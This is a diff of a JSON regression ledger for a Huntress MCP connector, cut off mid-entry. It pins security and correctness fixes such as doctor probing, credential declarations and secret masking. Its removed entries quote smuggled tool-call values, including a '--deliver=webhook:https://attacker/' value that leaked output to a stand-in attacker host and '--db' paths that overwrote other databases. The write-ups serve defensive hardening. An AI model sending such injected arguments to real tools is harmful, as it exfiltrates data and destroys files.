@@ -6,7 +6,7 @@
   {
    "id": "doctor-verdict-tracks-reality",
    "summary": "doctor probes a real GET endpoint with the real credential and refuses to dial a placeholder base_url, instead of calling any HTTP response 'reachable' and never checking the credential",
-   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. REPRINT 4.32.5 (2026-09-28): the press now emits doctorInfoKeys/doctorIsInfoKey and the key-aware --fail-on scan natively in doctor.go (so doctor_verdict.go no longer defines them) and has dropped the 'but auth was accepted' line for a WARN. Still connector-only: refusing to dial the shipped placeholder base_url, the explicit ERROR row when no credential is configured, and doctorUnexpectedStatus (404 = wrong base_url, api row goes red). Also re-applied at the 4.32.5 review: the generated credential probe used the cache-enabled GetWithHeaders, so a credential revoked server-side could read 'valid' from a cached 200 for the cache TTL; doctor.go now calls GetWithHeadersNoCache. And doctorShippedBaseURL is EMPTY for huntress: https://api.huntress.io is the real, only API host, so an operator who never set HUNTRESS_BASE_URL is correctly configured - filling the literal in (v0.1.5 and earlier) made doctor refuse to probe every default install.",
+   "why": "`doctor` is the command every SKILL, guide and docs page tells an operator to run to confirm the connector works, and it could not tell a working install from a broken one. It called any HTTP response to `GET /` \"reachable\" and rendered it green, so a base_url aimed at the vendor's web UI (where every API path 404s) and a token rejected with 401 on every call both produced an all-green report. On this connector family it also never probed the credential at all: it printed \"present, not verified\" and left the operator to guess. The mirror defect: a connector whose shipped base_url default is a placeholder dialled the placeholder host, and the DNS failure rendered as \"FAIL API: unreachable\" - telling a correctly-credentialled operator they were broken without naming the one variable that would fix it. Several placeholder hosts resolve through live wildcard DNS and answer real HTTP, so dialling one produced a confident green verdict against a stranger's server. Measured and gated by tools/maintainer/check_doctor_truth.py. See issue #282. REPRINT 4.32.5 (2026-09-28): the press now emits doctorInfoKeys/doctorIsInfoKey and the key-aware --fail-on scan natively in doctor.go (so doctor_verdict.go no longer defines them) and has dropped the 'but auth was accepted' line for a WARN. Still connector-only: refusing to dial the shipped placeholder base_url, the explicit ERROR row when no credential is configured, and doctorUnexpectedStatus (404 = wrong base_url, api row goes red). Also re-applied at the 4.32.5 review: the generated credential probe used the cache-enabled GetWithHeaders, so a credential revoked server-side could read 'valid' from a cached 200 for the cache TTL; doctor.go now calls GetWithHeadersNoCache. And doctorShippedBaseURL is EMPTY for huntress: https://api.huntress.io is the real, only API host, so an operator who never set HUNTRESS_BASE_URL is correctly configured - filling the literal in (v0.1.5 and earlier) made doctor refuse to probe every default install. REPRINT 4.34.0 (2026-10-24): the press now generates doctorBaseURLIsPlaceholder in doctor.go for literal unset values, so the connector's shipped-placeholder check is renamed doctorBaseURLIsShippedPlaceholder and doctor.go calls both.",
    "status": "active",
    "asserts": [
     {
@@ -15,7 +15,7 @@
     },
     {
      "file": "cli/internal/cli/doctor_verdict.go",
-     "contains": "func doctorBaseURLIsPlaceholder("
+     "contains": "func doctorBaseURLIsShippedPlaceholder("
     },
     {
      "file": "cli/internal/cli/doctor.go",
@@ -48,13 +48,43 @@
      "contains": "const doctorShippedBaseURL = \"\"",
      "min_count": 1,
      "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"credentials\"] = \"ERROR not verified: no credential is configured, so nothing was probed.\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "report[\"api\"] = \"not configured (base_url is a placeholder); set \" + doctorBaseURLEnv + \" to your own instance URL\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor_verdict.go",
+     "contains": "func doctorBaseURLIsShippedPlaceholder(base string) bool {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/cli/doctor.go",
+     "contains": "doctorBaseURLIsShippedPlaceholder(cfg.BaseURL)",
+     "min_count": 1,
+     "code_only": true
     }
    ]
   },
   {
    "id": "install-credentials-declared-on-every-channel",
    "summary": "every operator credential this connector reads is declared on all three install channels: manifest.json (.mcpb), server.json (MCP Registry) and mcp-install.md (manual install)",
-   "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For huntress the manifest gained: HUNTRESS_BASE_URL. server.json gained: HUNTRESS_BASE_URL. mcp-install.md's env blocks gained: HUNTRESS_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out.",
+   "why": "Issue #282 ('three live-verified connectors prompt for the wrong credentials'). A connector is installed through THREE independent channels that each carry their own copy of the credential list: manifest.json server.mcp_config.env (what the .mcpb bundle hands Claude Desktop, which has no shell profile, no config.toml and no export - so an undeclared variable is a variable nobody is ever asked for), server.json environmentVariables (the MCP Registry publish channel), and mcp-install.md's copy-paste JSON blocks plus its remote launch line (the manual path, which never touches the bundle at all). The fleet-wide audit found 60 of 65 connectors under-declaring 122 operator-facing variables in the manifest, 61 of 65 mcp-install.md pages omitting 125, and hudu's server.json missing the base URL its manifest marks required. For huntress the manifest gained: HUNTRESS_BASE_URL. server.json gained: HUNTRESS_BASE_URL. mcp-install.md's env blocks gained: HUNTRESS_BASE_URL. manifest.json, server.json and mcp-install.md are ALL regenerated by /msp-skills-publish on an UPDATE or re-onboard, so without this ledger a regeneration silently drops every declaration and CI stays green (check_env_schema.py is wired --warn). The asserts below name the specific credentials, not a count, so dropping one and adding another cannot cancel out. REPRINT 4.34.0 (2026-10-24): the press adds the runtime switches HUNTRESS_MCP_READ_ONLY (preset to 1 on every channel) and HUNTRESS_NO_LOCAL_DATA; both are declared on all three channels and pinned here.",
    "status": "active",
    "spec_encode_followup": "cli-printing-press should emit server.mcp_config.env, the matching user_config prompts, server.json environmentVariables and mcp-install.md's env blocks from ONE declaration of the connector's operator-facing environment, so the three channels cannot be generated out of step. Until then check_env_schema.py compares all three and this ledger pins them.",
    "asserts": [
@@ -102,104 +132,36 @@
      "file": "mcp-install.md",
      "contains": "\"HUNTRESS_BASE_URL\":",
      "min_count": 3
-    }
-   ]
-  },
-  {
-   "id": "mcp-filesystem-destination-gate",
-   "summary": "The MCP shell-out layer refuses filesystem-destination flags (--db, --input, --output, --out, --home, --audit-dir, --receipt-file and friends) and any argument name carrying '=', so a tool call cannot point the local SQLite store, or any other file this account can reach, at a path of its choosing",
-   "why": "The MCP server runs the companion CLI as the server account and forwarded every command-local flag straight through as a CLI argument. `sync` and the other local-store commands expose --db, and the store's migration runs `DROP TABLE IF EXISTS resources_fts` plus a resources-table rebuild against whatever file it is handed, so one tool call shaped {\"db\": \"/path/to/someone-elses.sqlite\"} rewrote an unrelated database - no credentials required, because sync opens the store before it ever reaches the API. Proven end to end: against the pre-fix binary a single MCP tools/call on `sync` changed the victim file's sha and left resources_fts with 0 rows; against the patched binary the same call returns the same sync summary and the victim file is byte-identical. The gate has three parts, all in cli/internal/mcp/cobratree/shellout.go: blockedDestinationFlags (the runtime name floor, unioned into cliArgsFromMCP alongside the pre-existing blockedRootFlags behaviour, which is unchanged); an argument-name '=' guard, because \"db=/tmp/evil\" was emitted as --db=/tmp/evil and a name-only denylist never saw it; and isFilesystemPathFlag, which classifies a flag by its USAGE TEXT rather than its NAME. The usage-text test is load bearing and must not be turned into a name rule: the generated command surface carries API body fields called --path, --seed-path, --source-paths, --exclude-paths, --filename and --working-dir whose values go to the vendor API and never touch this account's disk, so a name rule would break real API surfaces while still missing the next generated flag that does take a local path. UnblockedFilesystemPathFlags applies that rule to the live Cobra tree over exactly the command set RegisterAll turns into shell-out tools (endpoint and framework commands are out of scope, which is what keeps the rule off generated vendor body fields), and TestNoShellOutToolCanDirectAFilesystemPath fails the build when a regeneration grows a local-path flag the floor does not name. vendorAPIPathFlags is the documented exception list for flags whose usage trips the rule but which name a location in the vendor's world. Both directions are pinned by the tests: the --db argument must be dropped AND an ordinary flag must still be forwarded, because a gate that swallows the real MCP surface is as harmful as one that misses the defect. REPRINT 4.32.5 (2026-09-28): cli-printing-press now emits blockedDestinationFlags natively (audit-dir, db, o, output, receipt-file), folds it into every tool's blocked set via blockedStructuredArgsForCommand in typemap.go (so blocked flags are also dropped from the tool's input schema and unknown names are rejected by validateMCPArgumentNames - both residuals below are closed), and refuses argument names carrying '='. Still connector-only: the wider floor (from-csv, home, input, notes-file, out, playbook-file, playbook-notes-file, reconcile), the usage-text rule (isFilesystemPathFlag / filesystemPathFlagPhrases), UnblockedFilesystemPathFlags and the two hand-written test files that walk the live tree.",
-   "status": "active",
-   "spec_encode_followup": "Press-side: the gate belongs in the generator. Two known residuals a reprint should close rather than re-inherit. (1) On the pre-4.30 cobratree the blocked flags are dropped at forward time but still appear in the tool's input schema, because toolOptionsForFlags in typemap.go advertises every flag; the caller gets silence instead of an error. The 4.30 shape (blockedStructuredArgsForCommand + allowedStructuredArgsForCommand) removes them from the schema and errors on them, which is the better behaviour. (2) isFilesystemPathFlag is only consulted by the package test here, not at request time, because the pre-4.30 shellOutToCLI receives no *cobra.Command; wiring it into the per-command blocked set (as skills/servosity does) makes a newly generated path flag refused at runtime rather than at CI time.",
-   "asserts": [
+    },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "var blockedDestinationFlags = map[string]bool{",
+     "file": "manifest.json",
+     "contains": "\"HUNTRESS_MCP_READ_ONLY\": \"${user_config.huntress_mcp_read_only}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/typemap.go",
-     "contains": "for name := range blockedDestinationFlags {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "strings.Contains(k, \"=\")",
+     "file": "server.json",
+     "contains": "\"name\": \"HUNTRESS_MCP_READ_ONLY\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func isFilesystemPathFlag(flag *pflag.Flag) bool {",
+     "file": "mcp-install.md",
+     "contains": "\"HUNTRESS_MCP_READ_ONLY\":",
+     "min_count": 3
+    },
+    {
+     "file": "manifest.json",
+     "contains": "\"HUNTRESS_NO_LOCAL_DATA\": \"${user_config.huntress_no_local_data}\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "func UnblockedFilesystemPathFlags(root *cobra.Command) []string {",
+     "file": "server.json",
+     "contains": "\"name\": \"HUNTRESS_NO_LOCAL_DATA\"",
      "min_count": 1
     },
     {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotDirectTheLocalStore(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_gate_test.go",
-     "contains": "func TestMCPCannotSmuggleAFlagThroughAnEqualsSign(",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/filesystem_tree_test.go",
-     "contains": "func TestNoShellOutToolCanDirectAFilesystemPath(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "mcp-argv-value-joined",
-   "summary": "cliArgsFromMCP emitted every tool-call value as its OWN argv element after its flag (--json <value>). Every value-carrying branch (string, float64, []any, default) now joins the value to the flag as one element (--json=<value>); bool true stays a bare --flag and the empty-string skip is unchanged.",
-   "why": "blockedRootFlags and blockedDestinationFlags filter KEYS only. A Cobra bool flag has NoOptDefVal and does not consume the token after it, so a tool-call VALUE that begins with '--' was parsed by pflag as its own flag: {\"json\": \"--deliver=webhook:https://attacker/\"} became argv `--json --deliver=webhook:...` and the denylisted --deliver took effect. Proven end to end on the real hudu-mcp binary (this same generated shellout.go) during the PR #317 review: a local webhook received 4,797 bytes of `doctor --json` output. Reported privately per SECURITY.md on 2026-09-09 as affecting the whole fleet (six connectors spot-checked by the reporter); this is the fleet backport of datagate commit 4075043e. Joined, pflag rejects the value outright on a bool flag (strconv.ParseBool) and contains it as the literal value on a string flag, so no value can ever reach a second flag. Fixed upstream in cli-printing-press main at be378adf (#4647, closes #4643, 2026-09-09) with the identical four lines, but NOT yet in a tagged press release (latest 4.32.1), so a reprint from any press at or below 4.32.1 REINTRODUCES the defect while go build and go test stay green; this entry is what notices. Retire it only after a reprint from a press release that carries #4647. code_only because the explanatory comment above the loop describes the joined form - the assert must be satisfied by the emission lines themselves. shellout_test.go (TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag) proves both directions: the split argv sets --deliver, the joined argv cannot. REPRINT 4.32.5 (2026-09-28): the joined --flag=value emission is native in the press's cobratree/shellout.go.tmpl (all four value branches) and its own TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag; only the one-element-per-branch table (the \"--filter=map[a:1]\" default-branch case) is still a hand addition to the generated test.",
-   "status": "upstreamed",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+tv)",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strconv.FormatFloat(tv, 'f', -1, 64))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+strings.Join(parts, \",\"))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "contains": "out = append(out, \"--\"+k+\"=\"+fmt.Sprintf(\"%v\", v))",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout.go",
-     "not_contains": "\"--\"+k, "
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "func TestCliArgsFromMCP_ValueCannotSmuggleBlockedFlag(",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/mcp/cobratree/shellout_test.go",
-     "contains": "\"--filter=map[a:1]\"",
-     "min_count": 1,
-     "code_only": true
+     "file": "mcp-install.md",
+     "contains": "\"HUNTRESS_NO_LOCAL_DATA\":",
+     "min_count": 3
     }
    ]
   },
@@ -213,116 +175,6 @@
      "file": "cli/cmd/huntress-mcp/main.go",
      "contains": "ReadHeaderTimeout: 10 * time.Second,",
      "min_count": 1,
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "mcp-store-path-matches-cli",
-   "summary": "The MCP search/sql tools resolve the local store through the CLI's own resolver, so they read the credential-scoped data-<hash>.db that `sync` writes on a fresh install",
-   "why": "cli-printing-press 4.32 scopes a FRESH local store by a hash of the configured credential (helpers.go defaultDBPathInDir: data-<hash>.db unless a legacy data.db already exists), but the generated internal/mcp/tools.go mcpDBPath still hard-codes data.db. On a new install every sync - including one the MCP server itself shells out to - lands in the scoped file and the MCP search and sql tools then report that no store exists. Found by the 4.32.5 reprint review (Codex P1). The fix adds hand-authored internal/cli/mcp_store_path.go (MCPStorePath, which calls the same defaultDBPathInDir) and makes mcpDBPath return cli.MCPStorePath(); internal/mcp/store_path_test.go fails against the pristine resolver (proven both directions). A reprint regenerates tools.go with the hard-coded path and the build stays green. DURABLE FIX belongs in the press's mcp tools.go template; file via printing-press-retro.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "cli/internal/mcp/tools.go",
-     "contains": "return cli.MCPStorePath()",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cli/mcp_store_path.go",
-     "contains": "func MCPStorePath() (string, error) {",
-     "min_count": 1
-    },
-    {
-     "file": "cli/internal/mcp/store_path_test.go",
-     "contains": "func TestMCPStorePathFollowsCredentialScopedCLIStore(",
-     "min_count": 1
-    }
-   ]
-  },
-  {
-   "id": "windows-sddl-alias-sid-compare",
-   "summary": "the Windows token-file guard compares trustees by SID, resolving SDDL aliases through the OS, so the built-in Administrator (RID 500, rendered as LA) can save and load credentials",
-   "why": "Press 4.30.2+ creds_perms_eval.go compared the SDDL text of the token file's owner and ACE trustees against the process's SID string. The SDDL converter renders the built-in local Administrator (RID 500) as the alias LA, so that account's own ACE never matched: `auth set-token` exited 1 with `token file DACL grants access to a non-owner principal (LA)` and every read refused the file. Reproduced 2026-10-15 on the published fortinet-cli 0.1.0, installed with the README one-liner on a windows-latest runner (whoami S-1-5-21-...-500). The fix resolves each trustee to its SID (fixed aliases from a table, machine-relative ones like LA through ConvertStringSidToSid, kept only when the converter renders that SID back to the same alias) and compares SIDs. The allow-list is unchanged (current user, BUILTIN\\Administrators, SYSTEM): an owner or allow-ACE trustee that is any other principal, a broad group, or unresolvable is still refused. A reprint from an unfixed press silently restores the string compare while unit tests stay green on every non-Windows host.",
-   "status": "active",
-   "spec_encode_followup": "Press defect in internal/generator/templates/cliutil_creds_perms_eval.go.tmpl and cliutil_creds_perms_windows.go.tmpl (unfixed on press main as of 4.33.5). Reported upstream: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "func trusteeSID(trustee string, resolveAlias sddlAliasResolver) string {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if om == nil || !sidAllowed(trusteeSID(om[1], resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !sidAllowed(trusteeSID(trustee, resolveAlias), currentUserSID) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "return evalCredsSecurityResolved(sd.String(), me, resolveSDDLAlias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "contains": "sid, err := windows.StringToSid(alias)",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_windows.go",
-     "not_contains": "return evalCredsSecurity(sd.String(), me)"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityResolvesSDDLAliases(t *testing.T) {",
-     "code_only": true
-    }
-   ]
-  },
-  {
-   "id": "windows-null-dacl-behind-flags",
-   "summary": "the Windows token-file guard checks the DACL section's framing, so a NULL DACL is refused in the form Windows actually renders it, flags first (D:PAINO_ACCESS_CONTROL), and DACL text that does not frame as flags plus complete six-field ACEs is refused rather than skipped",
-   "why": "Press creds_perms_eval.go refused a NULL DACL only when the DACL section began with NO_ACCESS_CONTROL. SDDL puts DACL flags (P, AI, AR) first, and a real NULL DACL on Windows Server 2025 renders as O:<owner>D:PAINO_ACCESS_CONTROL (measured on a windows-latest runner, 2026-10-15), so the guard found no ACEs to inspect and accepted a world-accessible token file. That was already a hole for every ordinary account; for the built-in Administrator the owner-alias mismatch happened to refuse it, so resolving LA (windows-sddl-alias-sid-compare) without this fix would have widened the hole. The DACL section's framing is now checked: its flags must be drawn from P/AI/AR/NO_ACCESS_CONTROL, an empty DACL followed by a SACL section ends at that section, and the ACE list must be complete, un-nested (...) groups of exactly six fields. Unknown flags, an unclosed or nested group, stray text, or a wrong field count is refused (fail-closed). ACE flags and rights are not validated; they do not change which principal an allow ACE names.",
-   "status": "active",
-   "spec_encode_followup": "Same press templates as windows-sddl-alias-sid-compare; reported in the same upstream issue: https://github.com/mvanhorn/cli-printing-press/issues/5029",
-   "asserts": [
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if strings.Contains(daclFlags, \"NO_ACCESS_CONTROL\") {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !daclFlagsRe.MatchString(daclFlags) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if !aceListRe.MatchString(rest[flagsEnd:]) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "contains": "if len(fields) != 6 {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_eval.go",
-     "not_contains": "if strings.HasPrefix(rest, \"NO_ACCESS_CONTROL\") {"
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityRefusesNullDACLBehindFlags(t *testing.T) {",
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/cliutil/creds_perms_sddl_test.go",
-     "contains": "func TestEvalCredsSecurityChecksTheDACLSectionFraming(t *testing.T) {",
      "code_only": true
     }
    ]
@@ -352,55 +204,10 @@
    ]
   },
   {
-   "id": "interim-http-security-note-2026-10-22",
-   "summary": "mcp-install.md and README.md open with the interim HTTP-mode security note and pauses the remote-agent recipe (launch line commented out, no tunnel step) until this connector is reprinted; the README and page.json ChatGPT answers say HTTP mode is paused.",
-   "why": "Docs-only interim fix ratified 2026-10-22. This build's HTTP mode is unsafe (no password and/or no rebinding guard, no request limits, writes with no confirmation), so the install guide must not tell anyone to run it or tunnel it. mcp-install.md is regenerated by msp-skills-publish onboard.py; this entry makes a regeneration that drops the note fail CI. Remove it on purpose with the post-reprint docs fix. 2026-10-22 follow-up to #428: README.md (security note under \"Works with your agent\", the ChatGPT / Copilot Studio / Gemini rows, the ChatGPT paragraph and FAQ) and page.json (ChatGPT FAQ, and from there docs/skills and llms-full.txt) carry the same pause. README.md is regenerated by onboard.py render_readme; page.json's FAQ is agent-authored prose, so a re-polish that restores the HTTPS/tunnel answer fails here.",
-   "status": "active",
-   "asserts": [
-    {
-     "file": "mcp-install.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "contains": "# Remote agents (paused until this connector is reprinted)",
-     "min_count": 1
-    },
-    {
-     "file": "mcp-install.md",
-     "not_contains": "via a secure tunnel"
-    },
-    {
-     "file": "README.md",
-     "contains": "**Security note (until this connector is reprinted).**",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "contains": "### Does this work with ChatGPT?\n\nNot with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "README.md",
-     "not_contains": "--addr :7777"
-    },
-    {
-     "file": "page.json",
-     "contains": "\"a\": \"Not with this build.",
-     "min_count": 1
-    },
-    {
-     "file": "page.json",
-     "not_contains": "--addr :7777"
-    }
-   ]
-  },
-  {
    "id": "secret-echo-decoded-funnel",
    "class": "secret-echo",
    "summary": "One decoded output funnel for every server text the client shows: maskCredentialText (every API error, transport error, displayed URL and --dry-run parameter goes through it) still masks each held credential as written and URL-escaped, then withholds the WHOLE text if any held value survives in any view reachable by undoing control/format characters, JSON and JavaScript escapes, percent escapes at any depth, HTML entities, markup tags, and base64/base64url/hex runs at every alignment (cliutil.FunnelWithhold, shared byte-identical across the fleet). The held set is every value the masks cover plus the part after a scheme word and both halves of a base64 id:secret pair (Basic auth, composed keys). Surfaces funnelled here: the API error body (checked whole before the 4096-byte display cut, then again as shown); the title of an HTML page returned where JSON was expected. Round 3 (owner-approved structural pass): the decoder searches every view breadth-first over one fixed set of steps (control-character drop, JSON and JavaScript escapes, the identity escape as its own step, percent, HTML entities, tag strip, base64 at four alignments, hex at two), matches every view, the original included, before any filter, keeps every view a step makes (a literal backslash survives), deduplicates, and is capped by total work (512 times the input plus 4 MiB; text over 1 MiB or past the cap is withheld). Every value a funnel call is given is held process-wide (cliutil.FunnelHold), and the client holds its credentials when built and its resolved auth header on every request. Two error-only backstops withhold any held value: every command error before Cobra prints it plus every JSON/agent error envelope (internal/cli/secret_funnel_cli.go), and every MCP error result and handler error through the outermost tool middleware (cmd/<mcp>/secret_funnel_mcp.go). Success output is never funnelled.",
-   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts.",
+   "why": "class_harness.py secret-echo (Step 3.1, PR #436) drives the built CLI and MCP server against a fake server that reflects each configured credential in every encoding; on origin/main this connector printed the credential HTML-entity-encoded, JSON-escaped, double URL-encoded or base64 (the generated masks cover only the raw, QueryEscape and PathEscape forms; press issue #5145). Matching encoded needles one at a time never converged (saas-alerts and cisco-meraki review loops), so the fix is a decode-then-check backstop that withholds the whole text and fails closed (text over 4 MiB, a decoding chain that does not settle in 32 rounds, or work past the budget is withheld). Classification is kept: the plain withheld notice avoids every word the auth-error classifiers match, and a withheld text that itself read as an auth failure gets a notice that says so (an HTTP 400 'invalid token' answer echoing the token keeps its auth exit code). Codex round 1 (2026-10-23) added that, the fail-closed depth bound (a text-like layer left at depth 8 withholds), the JavaScript escapes \\v, \\0 and the identity escape, a bounded \\u{ search, and the token-endpoint error bodies outside the client. Known limits: values under 8 characters are only masked as written; case-changed, split-and-interleaved or otherwise transformed (compressed, encrypted) echoes are not reconstructed. A reprint that drops these edits fails class_harness.py secret-echo in CI and these asserts. Codex r2 success-body class (2026-10-24): every successful answer now passes one check, funnelSuccessBody -> successBodyRefused, on every path: each cached read (a refused entry is deleted and the call falls through to a checked live request), the live binary envelope as returned (its content_type header and its text, plus its decoded bytes), and the live JSON/text body; the response cache moved to resources-success-checked and the legacy resources dir an older build served unchecked is removed when a client binds its cache; a body over the funnel's 1 MiB cap fails closed (not JSON: refused; JSON: checked in the existing overlapping windows AND in windows cut only between tokens, so every key, string, number and literal is checked whole, and a token over the cap is refused).",
    "status": "active",
    "spec_encode_followup": "Press-side: cli-printing-press issue #5145 (encoded credential echo). The generated maskCredentialText should end in a decode-then-check backstop over every held credential, and the error-body and token-endpoint paths should check the whole body before the display cut.",
    "asserts": [
@@ -424,19 +231,13 @@
     },
     {
      "file": "cli/internal/client/client.go",
-     "contains": "return cliutil.FunnelWithhold(masked, held)",
+     "contains": "return cliutil.FunnelWithhold(finishCredentialMask(masked, secrets), append(held, credentialFragments(held)...))",
      "min_count": 1,
      "code_only": true
     },
     {
      "file": "cli/internal/client/client.go",
      "contains": "func (c *Client) shownErrorBody(body []byte, extraCredentials ...string) string {",
-     "min_count": 1,
-     "code_only": true
-    },
-    {
-     "file": "cli/internal/client/client.go",
-     "contains": "Body:       c.shownErrorBody(respBody, authHeader),",
      "min_count": 1,
      "code_only": true
     },
@@ -545,8 +346,1374 @@
     {
      "file": "cli/internal/cli/helpers.go",
      "not_contains": "\"error\": err.Error(),"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "bodyText := c.shownErrorBody(respBody, authHeader)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "not_contains": "bodyText := truncateBody(respBody)"
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "c.holdCredentials()",
+     "min_count": 2,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "if _, ferr := c.funnelSuccessBody(data, c.cachedAuthHeader()); ferr != nil {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "func removeRefusedCacheEntry(cacheFile string) {",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "removeRefusedCacheEntry(cacheFile)",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "\"resources-success-checked\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
+     "contains": "legacyResponseCacheResources = \"resources\"",
+     "min_count": 1,
+     "code_only": true
+    },
+    {
+     "file": "cli/internal/client/client.go",
